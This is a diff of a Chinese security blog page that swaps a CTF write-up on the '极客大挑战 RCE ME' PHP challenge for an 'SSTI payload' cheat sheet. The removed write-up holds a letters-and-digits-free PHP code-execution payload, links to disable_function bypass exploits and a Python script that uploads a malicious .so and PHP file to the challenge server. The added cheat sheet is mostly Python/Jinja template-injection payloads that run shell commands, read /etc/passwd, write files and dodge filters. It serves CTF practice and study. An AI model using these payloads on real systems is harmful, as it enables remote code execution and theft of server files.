@@ -4,10 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="[极客大挑战] RCE ME, Z3ratu1&#39;s blog">
-    <meta name="description" content="极客大挑战 RCE ME三叶草招新赛里面一个比较难的题，无字母数字命令执行+bypass disable_function当时做的时候不会手搓上传就弃了，今天在buu上复现重做了一遍
-无字母数字命令执行&amp;lt;?php
-error_repo">
+    <meta name="keywords" content="SSTI payload, Z3ratu1&#39;s blog">
+    <meta name="description" content="SSTI payload记录一下ssti各种各样绕过的payloadpython不同版本以及不同框架中有的数组下标不一致，可能需要看情况酌情修改并且每个环境总是有一些奇奇怪怪的不同点，除了开头的几个地方可以照抄之外，真正实战的时候估计还是得">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -15,7 +13,7 @@ error_repo">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>[极客大挑战] RCE ME | Z3ratu1&#39;s blog</title>
+    <title>SSTI payload | Z3ratu1&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -287,13 +285,13 @@ error_repo">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/img/ctf.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        [极客大挑战] RCE ME
+                        SSTI payload
                     </div>
                 </div>
             </div>
@@ -402,12 +400,25 @@ error_repo">
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ssti/" target="_blank">
+                                <span class="chip bg-color">ssti</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category" target="_blank">
+                                笔记
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -422,7 +433,7 @@ error_repo">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        1.1k
+                        984
                     </div>
                     
 
@@ -445,51 +456,19 @@ error_repo">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="极客大挑战-RCE-ME"><a href="#极客大挑战-RCE-ME" class="headerlink" title="极客大挑战 RCE ME"></a>极客大挑战 RCE ME</h1><p>三叶草招新赛里面一个比较难的题，无字母数字命令执行+bypass disable_function<br>当时做的时候不会手搓上传就弃了，今天在buu上复现重做了一遍</p>
-<h2 id="无字母数字命令执行"><a href="#无字母数字命令执行" class="headerlink" title="无字母数字命令执行"></a>无字母数字命令执行</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
-    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token keyword">else</span><span class="token punctuation">{</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-<span class="token comment" spellcheck="true">// ?></span></code></pre>
-<p>相比于SUCTF的命令执行简单了很多，直接使用取反~就能节约很多字符，也没有对使用字符种类的限制，可以直接构造简单的执行语句<br>var_dump(scandir(‘/‘));扫描目录发现根目录下有flag文件和readflag，直接读读不出来没权限，那么就是需要执行readflag了，但是从phpinfo里面可以看到禁止了能用的所有执行命令行的函数，但是有一个assert可以用，就构造一个assert($_GET[_])进行命令执行，跳出长度限制，任意执行命令</p>
-<h3 id="可能的小坑"><a href="#可能的小坑" class="headerlink" title="可能的小坑"></a>可能的小坑</h3><p>这里的eval($code)和eval($_GET[code])是不一样的，前者如果我们想要code=$_GET[a];&amp;a=func()是不能执行函数的，后端只会获得一个a=func()的变量，只有当code=$_GET[a]();&amp;a=func才行，变量名后面接括号将会被认为是一个<strong>可变函数</strong>，从而完成执行，PHP7允许可变函数带参数。但是我们这里再构造一层assert($_GET[_])，就又跳了出来，回到了前者的情况，就能绕过判断进行任意命令执行了</p>
-<p>eval，echo等语句并不能以可变函数的形式被调用，因为他们是一个语言结构，在PHP7中，assert也变为了一个语言结构，具体可以看这篇文章<a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html</a><br><a href="https://www.sohu.com/a/302465075_750628" target="_blank" rel="noopener">https://www.sohu.com/a/302465075_750628</a></p>
-<p>函数名需要用括号括一下，尤其是像上述var_dump这样还有函数嵌套的，括号要括对。<br>这里之前看别人的payload，他将美元符号$也通过取反编码传入，这样子的话后端只能获得一个内容为$_GET[_]的字符串，自然无法执行命令，而我们传入一个美元符号，后端自然会认为这个是一个变量进一步解析，就能实现一个$_GET的功能。</p>
-<p>到目前的payload： <code>?code=(~%9E%8C%8C%9A%8D%8B)(${~%A0%B8%BA%AB}[_]);</code> 即assert($_GET[_])</p>
-<p>这里测试了一下用eval($_GET[_])就不行，也不知道为什么，只能用assert</p>
-<h2 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h2><p>bypass disable_function已经是一个老生常谈了，通过LD_PRELOAD加载恶意.so动态链接库来进行劫持是一个常用方法，当然也不一定万用(以前还试过自己手动gcc编译一个动态链接库)，现在直接用GitHub现成项目就行，md里面也简要介绍了LD_PRELOAD是怎么绕过disable_function进行命令执行的<br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
-<p>还有一个json的，没怎么仔细看，顺手贴一下，只适用于php7<br><a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p>
-<p>当然问题在于怎么上传，上次就是卡在这了，这把想直接构造后门蚁剑连一下也没成。<br>被迫学习了手搓文件上传，用$FILE这个超全局变量来获取上传的文件，通过move_uploaded_file上传函数文件，由于没有open_basedir，我们之间把文件写在稳定有访问权限的/tmp目录下最为稳妥(据说答题现场这个目录下一堆木马)，用python的request库post方法实现上传，然后执行命令包含/tmp下的php文件，并加载动态链接库即可绕过disable_function，执行readflag拿到flag了<br>贴一下脚本</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-
-url <span class="token operator">=</span> <span class="token string">"http://7506331a-390b-42ac-b51f-12ae0a6dc457.node3.buuoj.cn/?code=(~%9E%8C%8C%9A%8D%8B)(${~%A0%B8%BA%AB}[_]);&amp;_=move_uploaded_file($_FILES['file']['tmp_name'], '/tmp/z3ratu1.so');"</span>
-evil_so <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'bypass_disablefunc_x64.so'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
-evil_php <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'bypass_disablefunc.php'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
-
-
-files <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'z3ratu1.so'</span><span class="token punctuation">,</span> evil_so<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
-data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"upload"</span><span class="token punctuation">:</span> <span class="token string">"Submit"</span><span class="token punctuation">}</span>
-r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
-
-url <span class="token operator">=</span> <span class="token string">"http://7506331a-390b-42ac-b51f-12ae0a6dc457.node3.buuoj.cn/?code=(~%9E%8C%8C%9A%8D%8B)(${~%A0%B8%BA%AB}[_]);&amp;_=move_uploaded_file($_FILES['file']['tmp_name'], '/tmp/z3ratu1.php');"</span>
-
-files <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'z3ratu1.php'</span><span class="token punctuation">,</span> evil_php<span class="token punctuation">,</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
-r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>
-<p>一开始传半天传不上去，检查了好几遍，又是分号没写又是引号没加的，丢人</p>
+                <h1 id="SSTI-payload"><a href="#SSTI-payload" class="headerlink" title="SSTI payload"></a>SSTI payload</h1><p>记录一下ssti各种各样绕过的payload<br>python不同版本以及不同框架中有的数组下标不一致，可能需要看情况酌情修改<br>并且每个环境总是有一些奇奇怪怪的不同点，除了开头的几个地方可以照抄之外，真正实战的时候估计还是得自己看回显去找，善用__dict__属性去找</p>
+<h2 id="eval命令执行"><a href="#eval命令执行" class="headerlink" title="eval命令执行"></a>eval命令执行</h2><p>感觉超强的好吧，只要ssti最基本的几个关键字不被禁用，后面引号内的内容都可以通过字符串拼接来绕过<br><code>&#39;&#39;.__class__.__mro__&amp;#91;2&amp;#93;.__subclasses__()&amp;#91;59&amp;#93;.__init__.__globals__&amp;#91;&#39;__builtins__&#39;&amp;#93;&amp;#91;&#39;eval&#39;&amp;#93;(&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)</code></p>
+<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><p><code>&#39;&#39;.__class__.__mro__&amp;#91;2&amp;#93;.__subclasses__()&amp;#91;59&amp;#93;.__init__.__globals__&amp;#91;&#39;__builtins__&#39;&amp;#93;&amp;#91;&#39;file&#39;&amp;#93;(&#39;/etc/passwd&#39;).read()</code><br>python3没有file这一项，使用open代替<br><code>&amp;#91;&amp;#93;.__class__.__base__.__subclasses__()&amp;#91;40&amp;#93;(&#39;/etc/passwd&#39;).read()</code><br>将read() 修改为 write() 即为写文件</p>
+<h3 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h3><p>用__dict__.keys().index()查找模块下标<br><code>&amp;#91;&amp;#93;.__class__.__base__.__subclasses__()&amp;#91;59&amp;#93;.__init__.__globals__&amp;#91;&#39;linecache&#39;&amp;#93;.__dict__.keys().index(&#39;os&#39;)</code><br>这样子就可以获得其下标，然后用__dict__.values()&#91;下标&#93;就能取得对应的模块</p>
+<h2 id="经典命令行payload"><a href="#经典命令行payload" class="headerlink" title="经典命令行payload"></a>经典命令行payload</h2><p><code>&amp;#123&amp;#125.__class__.__bases__&amp;#91;0&amp;#93;.__subclasses__()&amp;#91;59&amp;#93;.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()</code><br>popen执行一个命令行命令，以一个文件形式打开，用read()获取其内容<br><code>&amp;#123&amp;#125.__class__.__bases__&amp;#91;0&amp;#93;.__subclasses__()&amp;#91;59&amp;#93;.__init__.__globals__&amp;#91;&#39;__builtins__&#39;&amp;#93;&amp;#91;&#39;__import__&#39;&amp;#93;(&#39;os&#39;).system(&#39;ls&#39;)</code><br><code>&amp;#123&amp;#125.__class__.__bases__&amp;#91;0&amp;#93;.__subclasses__()&amp;#91;59&amp;#93;.__init__.__globals__&amp;#91;&#39;__builtins__&#39;&amp;#93;&amp;#91;&#39;__import__&#39;&amp;#93;(&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)</code></p>
+<h2 id="flask下payload"><a href="#flask下payload" class="headerlink" title="flask下payload"></a>flask下payload</h2><p><code>&amp;#123&amp;#37 for c in &amp;#91;&amp;#93;.__class__.__base__.__subclasses__() &amp;#37&amp;#125&amp;#123&amp;#37 if c.__name__==&#39;catch_warnings&#39; &amp;#37&amp;#125&amp;#123&amp;#123 c.__init__.__globals__&amp;#91;&#39;__builtins__&#39;&amp;#93;.open(&#39;txt.galf_eht_si_siht/&#39;&amp;#91;::-1&amp;#93;,&#39;r&#39;).read() &amp;#125&amp;#125&amp;#123&amp;#37 endif &amp;#37&amp;#125&amp;#123&amp;#37 endfor &amp;#37&amp;#125</code><br>这里还能用for循环直接获取模块名，不过用之前的方法找下标应该也可以。并且用字符串切片的方式翻转字符串绕过对flag字段的检查</p>
+<h2 id="python2-7-payload"><a href="#python2-7-payload" class="headerlink" title="python2.7 payload"></a>python2.7 payload</h2><p>和python3可能有一点出入，这个思路是把要执行的内容写入tmp文件夹，然后在将其执行</p>
+<pre class=" language-python"><code class="language-python"><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123&amp;#123 ''.__class__.__mro__&amp;#91;2&amp;#93;.__subclasses__()&amp;#91;40&amp;#93;('/tmp/evalcode', 'w').write('evalcode') &amp;#125&amp;#125</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123&amp;#123 config.from_pyfile('/tmp/evalcode') &amp;#125&amp;#125</span></code></pre>
+<h2 id="绕过中括号"><a href="#绕过中括号" class="headerlink" title="绕过中括号"></a>绕过中括号</h2><p>pop(index)函数代替中括号取得对应值</p>
+<h2 id="绕过引号和下划线"><a href="#绕过引号和下划线" class="headerlink" title="绕过引号和下划线"></a>绕过引号和下划线</h2><p>request.args是flask中的一个属性，返回GET请求的参数，这时候随便编一些名字作为参数传入即可代替字符串，类似于PHP的$_GET这种超全局数组<br>request.values则是可以获取get和post中所有参数<br>自然也可以用这种方法来绕过对关键字的过滤<br><code>&amp;#123&amp;#123().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&amp;#125&amp;#125&amp;path=/etc/passwd</code><br><code>&amp;#123&amp;#123 &#39;&#39;&amp;#91;request.args.class&amp;#93;&amp;#91;request.args.mro&amp;#93;&amp;#91;2&amp;#93;&amp;#91;request.args.subclasses&amp;#93;()&amp;#91;40&amp;#93;(&#39;/etc/passwd&#39;).read() &amp;#125&amp;#125&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></p>
+<h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><p>__getattribute__获取属性<br>这里__class__被过滤<br>使用base64编码绕过<br><code>&amp;#123&amp;#123&amp;#91;&amp;#93;.__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()&amp;#91;40&amp;#93;(&quot;/etc/passwd&quot;).read()&amp;#125&amp;#125</code><br>也可以加号拼接</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>这篇文章简单的讲了一下手找继承链的方法<br><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-47685-1-1.html</a><br><a href="https://www.cnblogs.com/zaqzzz/p/10251892.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/10251892.html</a></p>
 
             </div>
             <hr/>
@@ -648,9 +627,9 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《[极客大挑战] RCE ME》
+                    《SSTI payload》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/07/11/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%5D%20RCE%20ME/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/07/11/SSTI_payload/" property="cc:attributionName"
                rel="cc:attributionURL">
                 Z3ratu1
             </a> is licensed under a
@@ -690,36 +669,49 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2020/07/11/%5BFBCTF2019%5DRCEService/">
+                <a href="/2020/07/11/SSTI_payload/">
                     <div class="card-image">
                         
-                        <img src="/img/php.jpg" class="responsive-img" alt="[FBCTF2019]RCEService">
+                        <img src="/img/ctf.jpg" class="responsive-img" alt="SSTI payload">
                         
-                        <span class="card-title">[FBCTF2019]RCEService</span>
+                        <span class="card-title">SSTI payload</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            &#91;FBCTF2019&#93;RCEServicebuu上的题，最近打工开始划水，又要搞网鼎杯了，赶紧报一下佛脚
-json文件格式我太菜了，json属性字段一定要用双引号括起来，单引号是不可以的，为此我一开始试了半天，为什么输入什么
+                            SSTI payload记录一下ssti各种各样绕过的payloadpython不同版本以及不同框架中有的数组下标不一致，可能需要看情况酌情修改并且每个环境总是有一些奇奇怪怪的不同点，除了开头的几个地方可以照抄之外，真正实战的时候估计还是得
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-11
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-11
+                            </span>
                         <span class="publish-author">
                             
-                            <i class="fa fa-user fa-fw"></i>
-                            Z3ratu1
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category" target="_blank">
+                                    笔记
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ssti/" target="_blank">
+                        <span class="chip bg-color">ssti</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -731,22 +723,19 @@ json文件格式我太菜了，json属性字段一定要用双引号括起来，
                 Next&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/07/11/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/">
+                <a href="/2020/07/11/%5BGYCTF2020%5DFlaskApp/">
                     <div class="card-image">
                         
+                        <img src="/img/php.jpg" class="responsive-img" alt="[GYCTF2020]FlaskApp">
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="[GWCTF 2019]枯燥的抽奖">
-                        
-                        <span class="card-title">[GWCTF 2019]枯燥的抽奖</span>
+                        <span class="card-title">[GYCTF2020]FlaskApp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            [GWCTF 2019]枯燥的抽奖伪随机数安全的一个题，通过php_mt_rand这个工具逆向出随机数种子，然后通过种子获取字符串
-贴一下源码
-&lt;?php
-header("Content-Type: text/html;charset
+                            &#91;GYCTF2020&#93;FlaskAppflask的模板注入加一个debug模式下的命令执行
+题目开局给的是一个base64的加解密网站，说明了是flask写的，hint界面在注释里面藏了一句PIN（我一开始还不知道是什么意思
                         
                     </div>
                     <div class="publish-info">
@@ -755,11 +744,31 @@ header("Content-Type: text/html;charset
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fa fa-user fa-fw"></i>
-                            Z3ratu1
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-category" target="_blank">
+                                    刷题记录
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ssti/" target="_blank">
+                        <span class="chip bg-color">ssti</span>
+                    </a>
+                    
+                    <a href="/tags/flask/" target="_blank">
+                        <span class="chip bg-color">flask</span>
+                    </a>
+                    
+                    <a href="/tags/PIN/" target="_blank">
+                        <span class="chip bg-color">PIN</span>
+                    </a>
+                    
                 </div>
                 
             </div>
